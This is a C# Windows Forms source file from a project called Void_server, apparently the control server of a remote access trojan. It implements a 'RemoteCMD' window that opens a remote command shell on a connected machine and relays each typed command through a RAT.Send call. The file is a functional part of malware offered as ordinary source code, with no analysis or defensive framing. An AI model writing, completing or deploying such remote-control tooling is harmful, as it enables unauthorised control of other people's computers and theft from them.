using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using Void_server.Controls;
using Void_server.Libs;

namespace Void_server.Popups
{
    public partial class RemoteCMD : Form
    {
        public RemoteCMD()
        {
            InitializeComponent();
        }

        private void cmdInputBox_KeyDown(object sender, KeyEventArgs e)
        {
            //if the user hits the 'Return' or 'Enter' key
            if (e.KeyCode == Keys.Return)
            {
                if (cmdInputBox.Text == "cls")
                    cmdBox.Text = "";
                else
                    RAT.Send($"cmd|command|{cmdInputBox.Text}");

                e.SuppressKeyPress = true; //this just supresses the keypress, meaning that we won't get that annoying message when we hit return
            }
        }

        public void AddText(string text)
        {
            //add the text (the Invoke() is for making it thread safe)
            cmdBox.Invoke(new Action(() => cmdBox.AppendText(text + "\r\n")));
        }

        private void RemoteCMD_Load(object sender, EventArgs e)
        {
            RAT.Send("cmd|start");
        }

        private void RemoteCMD_FormClosing(object sender, FormClosingEventArgs e)
        {
            RAT.Send("cmd|stop");
        }
    }
}